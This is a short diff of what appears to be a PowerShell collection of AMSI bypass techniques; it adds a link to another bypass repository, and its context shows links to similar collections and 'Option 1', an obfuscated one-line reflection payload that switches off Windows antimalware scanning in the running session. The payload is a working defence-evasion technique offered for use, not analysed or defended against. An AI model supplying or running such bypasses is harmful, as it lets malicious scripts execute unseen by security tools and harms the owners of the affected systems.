@@ -2,6 +2,7 @@
 # find more on: 
 # https://github.com/tihanyin/PSSW100AVB
 # https://github.com/Abdulrhmanbk/Bypass-AMSI-2022
+# https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?s=03#Using-Hardware-Breakpoints
 ################################################################
 # Option 1:
 ([ref].assembly.gettypes()|?{$_.name-match'siu'}).declaredfields[2].setvalue(0,$true)
